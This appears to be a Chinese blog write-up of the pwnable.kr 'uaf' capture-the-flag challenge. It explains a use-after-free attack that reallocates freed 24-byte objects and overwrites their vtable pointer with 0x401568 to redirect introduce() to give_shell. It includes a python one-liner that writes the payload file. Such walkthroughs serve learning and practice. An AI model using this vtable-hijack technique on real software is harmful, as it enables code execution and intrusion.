<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="查看文件保护措施"><a href="#查看文件保护措施" class="headerlink" title="查看文件保护措施"></a>查看文件保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/9.png" class></strong></p>
<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>可以看出Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。</p>
<p>基本思路为：将main函数创建的两个对象先free，但指针并没有被销毁，之后我们allocate同样的大小，可以得到原先被释放的内存，这样就得到一个可控的地址空间，并且这个空间中记录了之前vptr指针，这样可通过改写这个虚表指针的值，之后再利用use，即m-&gt;introduce()时，劫持程序执行流，将本来执行的introduce函数变成执行give_shell函数。注意main中输入2分配空间是读取传入的两个参数，第一个决定分配空间的大小，第二个是读入一个文件，将文件中的内容写入到刚刚分配的空间中，因此我们首先要取得之前释放的空间，为保证这一点，需要使得传递的参数和之前释放的空间大小相同，而且这里需要分配两次，因为是两个对象，之后文件中的内容需将之前的虚表指针的值覆盖成我们想要的值，因为每个对象空间中的第一项记录的就是vptr，所以直接向文件中写入改写的虚表指针的值即可(从头开始读入，否则中间还需要填充一些字段)。</p>
<h3 id="寻找vtable的地址"><a href="#寻找vtable的地址" class="headerlink" title="寻找vtable的地址"></a>寻找vtable的地址</h3><p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/10.png" class></strong></p>
<p>直接在将文件拖入IDA64中查看（当然这里也可以用gdb动态调试，从main函数一步步跟进）。因为vptr指向的是vtable中的第一项，由第一项存放的内容是函数give_shell的地址，找到give_shell的位置可以确定vptr的地址为$0x401570$，第二项，即vptr+8所指向的位置，存放的内容是子类重写的函数introduce的地址，main函数中输入1（use）会调用introduce函数，因此我们需要在调用introduce函数时，讲vptr的指针指向give_shell函数，即将指针向前移动8个字节长度。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x401570</span> - <span class="number">8</span> = <span class="number">0x401568</span> -&gt; \x68\x15\x40\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure>

<h3 id="确定每个对象分配的空间大小"><a href="#确定每个对象分配的空间大小" class="headerlink" title="确定每个对象分配的空间大小"></a>确定每个对象分配的空间大小</h3><p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/11.png" class></strong></p>
<p>可见原本分配的两个对象的空间为$0x18 = 24Byte$，所以之后分配的空间也同样为24字节。（这里没有必要手动计算类对象所占空间的大小，因为不同机器可能会存在差异，知道存在哪些项即可，不必过于纠结为什么是24字节。）</p>
<h3 id="整理如下"><a href="#整理如下" class="headerlink" title="整理如下"></a>整理如下</h3><ul>
<li>输入3（free）：将分配的man和woman的空间释放（这里先释放man，在释放woman）</li>
<li>输入2（allocate）：先将woman释放的空间重新拿回</li>
<li>输入2（allocate）：再将man释放的空间重新拿回</li>
<li>输入（use）：通过传递的参数已经改写了vptr的值，执行introduce即give_shell，拿到flag</li>
</ul>
<h3 id="拿到flag"><a href="#拿到flag" class="headerlink" title="拿到flag"></a>拿到flag</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;\x68\x15\x40\x00\x00\x00\x00\x00&#x27;&quot;</span> &gt; /tmp/<span class="built_in">exp</span>.txt</span><br></pre></td></tr></table></figure>

<p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/12.png" class></strong></p>
]]></content>
      <tags>
        <tag>Pwnable.kr</tag>
      </tags>
  </entry>
</search>
